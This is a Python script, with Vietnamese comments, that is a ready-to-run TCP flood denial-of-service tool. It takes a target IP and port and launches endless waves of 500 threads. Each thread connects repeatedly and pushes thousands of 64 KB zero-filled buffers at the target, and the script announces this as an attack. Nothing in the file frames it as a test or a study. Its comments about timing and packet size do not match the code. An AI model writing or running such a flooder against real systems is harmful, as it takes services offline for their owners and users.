import socket
import threading
import time
import os
import sys
import random


if os.name == 'nt':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)


class xColor:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"


def send_packet(server_ip, server_port, packet, packet_count, thread_id):
    start_time = time.time()
    sent_total = 0
    
    while time.time() - start_time < 100000000000000000000000000000000000:
        try:
            # Thử kết nối và gửi dữ liệu
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((server_ip, server_port))
                s.settimeout(1)
                
                # Gửi gói tin liên tục
                for i in range(packet_count):
                    try:
                        s.sendall(packet)
                        sent_total += 1
                    except:
                        break
                        
        except Exception:
            # Nếu kết nối thất bại, thử lại ngay
            time.sleep(0.1)  # Nghỉ ngắn trước khi thử lại
            continue
    
    if sent_total > 0:
        print(f"{xColor.GREEN}Thread {thread_id}: Đã gửi {sent_total} gói tin trong 10s{xColor.RESET}")
    else:
        print(f"{xColor.RED}Thread {thread_id}: Không thể kết nối đến server{xColor.RESET}")


def attack_loop(server_ip, server_port, packet, packet_count, thread_count):
    thread_id_counter = 1
    
    while True:
        threads = []
        print(f"{xColor.CYAN} Khởi động {thread_count} luồng mới (ID: {thread_id_counter}-{thread_id_counter + thread_count - 1}){xColor.RESET}")
        
        # Tạo và khởi động tất cả luồng cùng lúc
        for i in range(thread_count):
            thread = threading.Thread(target=send_packet, 
                                     args=(server_ip, server_port, packet, packet_count, thread_id_counter),
                                     daemon=True)
            threads.append(thread)
            thread.start()
            thread_id_counter += 1
            time.sleep(0.01)  # Delay nhỏ để tránh tạo quá nhiều socket cùng lúc
        
        # Đợi 10 giây - thời gian mỗi luồng chạy
        time.sleep(10)
        
        # Đợi tất cả luồng hoàn thành
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=1)
        
        print(f"{xColor.YELLOW} Đợt tấn công hoàn thành. Chuẩn bị đợt tiếp theo...{xColor.RESET}\n")
        time.sleep(0.5)  # Nghỉ ngắn giữa các đợt


def main():
    if len(sys.argv) != 4:
        print(f"{xColor.RED}⚠ Sử dụng: python flood-tcp.py <ip> <port> flood{xColor.RESET}")
        print(f"{xColor.CYAN} Ví dụ: python flood-tcp.py 192.168.1.100 80 flood{xColor.RESET}")
        sys.exit(1)
    
    if sys.argv[3].lower() != "flood":
        print(f"{xColor.RED} Tham số thứ 3 phải là 'flood'{xColor.RESET}")
        sys.exit(1)
    
    server_ip = sys.argv[1]
    
    try:
        server_port = int(sys.argv[2])
    except ValueError:
        print(f"{xColor.RED} Port phải là số nguyên!{xColor.RESET}")
        sys.exit(1)
    
    # Thông số cố định
    packet_count = 1000  # Giảm số gói mỗi lần gửi để tránh timeout
    thread_count = 500    # Số lượng luồng mỗi đợt
    
    # Tạo packet nhỏ hơn để gửi nhanh hơn
    packet = b"\x00" * 65507  # Kích thước tối đa UDP (tương đương 64KB)
    
    print(f"{xColor.GREEN} Bắt đầu tấn công TCP Flood liên tục...{xColor.RESET}")
    print(f"{xColor.CYAN} Target: {server_ip}:{server_port}{xColor.RESET}")
    print(f"{xColor.CYAN} Mỗi luồng: {packet_count} gói tin/lần{xColor.RESET}")
    print(f"{xColor.CYAN} Mỗi đợt: {thread_count} luồng{xColor.RESET}")
    print(f"{xColor.CYAN} Thời gian mỗi luồng: 10 giây{xColor.RESET}")
    print(f"{xColor.YELLOW} Nhấn Ctrl+C để dừng{xColor.RESET}")
    print(f"{xColor.MAGENTA}=" * 50 + xColor.RESET)
    
    try:
        attack_loop(server_ip, server_port, packet, packet_count, thread_count)
    except KeyboardInterrupt:
        print(f"\n{xColor.RED} Đã dừng tấn công{xColor.RESET}")
    except Exception as e:
        print(f"{xColor.RED} Lỗi: {e}{xColor.RESET}")


if __name__ == "__main__":
    main()
